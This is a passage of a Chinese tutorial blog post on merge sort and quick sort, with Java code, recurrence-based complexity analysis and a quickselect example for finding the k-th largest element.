A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？</p>\n<p>如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。</p>\n<p>继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的性能分析\"><a href=\"#归并排序的性能分析\" class=\"headerlink\" title=\"归并排序的性能分析\"></a>归并排序的性能分析</h3></div><br></div>\n\n<p>还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。</p>\n<p><strong>第一、 归并排序是稳定的排序算法吗？</strong></p>\n<p>结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。</p>\n<p>在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。</p>\n<p><strong>第二、归并排序的时间复杂度是多少？</strong></p>\n<p>归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。</p>\n<p>在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。</p>\n<p>我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。</p>\n<p>从上面的分析，我们得出一个重要的结论：<strong>不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式</strong>。</p>\n<p>套用这个公式，我们来分析一下归并排序的时间复杂度。</p>\n<p>我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：<br>$$<br>\\begin{cases}<br>T(1) = C; &amp; n=1 \\\\[2ex]<br>T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程</p>\n<p>$$<br>\\begin{align*}<br>T(n) \\ &amp;= \\ 2*T(\\frac{n}{2}) \\ + \\ n \\\\[2ex]<br>&amp;= 2*(2 * T(\\frac{n}{4}) + \\frac{n}{2}) \\  + \\ n \\qquad = 4*T(\\frac{n}{4}) + 2*n \\\\[2ex]<br>&amp;= 4*(2* T(\\frac{n}{8}) + \\frac{n}{4}) \\  + \\ 2 * n \\ \\; = 8*T(\\frac{n}{8}) + 3*n \\\\[2ex]<br>&amp;= 8*(2* T(\\frac{n}{16}) + \\frac{n}{8}) \\  + \\ 3 * n \\ \\; = 16*T(\\frac{n}{16}) + 4*n \\\\[2ex]<br>&amp;= …… \\\\[2ex]<br>&amp;= 2^{k} * T(\\frac{n}{2^{k}}) + k * n<br>\\end{align*}<br>$$</p>\n<p>这样一步步推导，我们可以得到$T(n) \\ = \\ 2^{k} * T(\\frac{n}{2^{k}}) + k * n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\ = \\ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。</p>\n<p>从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。</p>\n<p><strong>第三、归并排序是不是原地排序算法呢？</strong></p>\n<p>归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。</p>\n<p>这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？</p>\n<p>如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？</p>\n<p>实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的原理\"><a href=\"#快速排序的原理\" class=\"headerlink\" title=\"快速排序的原理\"></a>快速排序的原理</h3></div><br></div>\n\n<p>我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。</p>\n<p>快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。</p>\n<p>第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。</p>\n<p>根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。</p>\n<p>如果我们用递推公式来将上面的过程写出来的话，就是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 递推公式</span><br><span class=\"line\">quick_sort(p...r) = quick_sort(p...q-<span class=\"number\">1</span>)+quick_sort(q+<span class=\"number\">1</span>...r)</span><br><span class=\"line\"></span><br><span class=\"line\"># 终止条件</span><br><span class=\"line\">p&gt;=r</span><br></pre></td></tr></table></figure>\n<p>我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    quickSort(arr, <span class=\"number\">0</span> , n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left&gt;=right) <span class=\"keyword\">return</span>; </span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid = partation(arr, left, right);</span><br><span class=\"line\">    quickSort(arr, left, mid-<span class=\"number\">1</span>);</span><br><span class=\"line\">    quickSort(arr, mid+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> base = arr[left];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left, j = right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;j)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[j] &gt;= base) j--;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[i] &lt;= base) i++;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i&lt;j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = arr[i];</span><br><span class=\"line\">            arr[i] = arr[j];</span><br><span class=\"line\">            arr[j] = temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    arr[left] = arr[i];</span><br><span class=\"line\">    arr[i] = base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation1</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = a[right];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=left; j&lt;=right-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[j]&lt;pivot)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = a[i];</span><br><span class=\"line\">            a[i] = a[j];</span><br><span class=\"line\">            a[j] = temp;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    a[right] = a[i];</span><br><span class=\"line\">    a[i] = pivot;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。</p>\n<p>如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。</p>\n<p>不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。</p>\n<p>原地分区函数的实现思路非常巧妙，我下面用伪代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">partation(a,p,r)&#123;</span><br><span class=\"line\">    pivot := A[r]</span><br><span class=\"line\">    i := p;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j:=p to r-<span class=\"number\">1</span> <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> A[j] &lt; pivot&#123;</span><br><span class=\"line\">            swap A[i] with A[j]</span><br><span class=\"line\">            i := i+<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap A[i] with A[r]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。</p>\n<p>数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。</p>\n<p>因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。</p>\n<p>到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？</p>\n<p>可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的性能分析\"><a href=\"#快速排序的性能分析\" class=\"headerlink\" title=\"快速排序的性能分析\"></a>快速排序的性能分析</h3></div><br></div>\n\n<p>现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。</p>\n<p>快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。</p>\n<p>$$<br>\\begin{cases} \\\\<br>\\ T(1) = C; &amp; n=1 \\\\[2ex]<br>\\ T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。</p>\n<p>我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。</p>\n<p>我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？</p>\n<p>实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。</p>\n<p>我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。</p>\n<p>如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。</p>\n<p>我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？</p>\n<p>第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1.</p>\n<p>如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。</p>\n<p>归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。</p>\n<p>快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？</p>\n<p>多路归并、外排序</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，<strong>归并排序</strong>和<strong>快速排序</strong>。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。</p>\n<p>归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：<strong>如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？</strong>，这就要用到今天讲的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的原理\"><a href=\"#归并排序的原理\" class=\"headerlink\" title=\"归并排序的原理\"></a>归并排序的原理</h3></div><br></div>\n\n<p>我们先来看看<strong>归并排序</strong>。</p>\n<p>归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。</p>\n<img src=\"/posts/2018-09-23-算法-排序(中)/归并排序原理图.jpg\" title=\"归并排序原理图\">\n<p>归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。</p>\n<p>从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。<strong>分治是一种解决问题的处理思想，递归是一种编程技巧</strong>，这两者并不冲突。</p>\n<p>前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。</p>\n<p>我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">递推公式</span><br><span class=\"line\">merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+<span class=\"number\">1</span>...r))</span><br><span class=\"line\"></span><br><span class=\"line\">终止条件</span><br><span class=\"line\">p&gt;=r 不在继续分解</span><br></pre></td></tr></table></figure>\n<p>我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。</p>\n<p>有了递推公式，转化成代码就简单多了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 归并排序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    merge_sort(a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 递归终止条件</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p&gt;=r) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取分区点</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> q = p + (r-p)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序左边</span></span><br><span class=\"line\">    merge_sort(a, p, q);</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序右边</span></span><br><span class=\"line\">    merge_sort(a, q+<span class=\"number\">1</span>, r);</span><br><span class=\"line\">    <span class=\"comment\">// 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]</span></span><br><span class=\"line\">    merge(a, p, q, r);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 合并数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> q, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> j = q + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> k = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 合并数组 a[p, q]  a[q+1, r] 到临时数组temp</span></span><br><span class=\"line\">    <span class=\"comment\">// 申请一个临时数组</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span>[] temp = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[r - p + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 根据两个数组最短的长度进行比较添加到temp中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (i&lt;=q&amp;&amp; j&lt;=r)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]&lt;=a[j])&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 看哪个数组还没有完成，将其放到temp后</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i&lt;=q)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;=q)&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (j&lt;=r)&#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(Arrays.toString(temp));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将temp中对应的数据放入原数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= r-p; i++) &#123;</span><br><span class=\"line\">        a[p+i] = temp[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你可能已经发现了，merge(A[p…r], A[p…q], 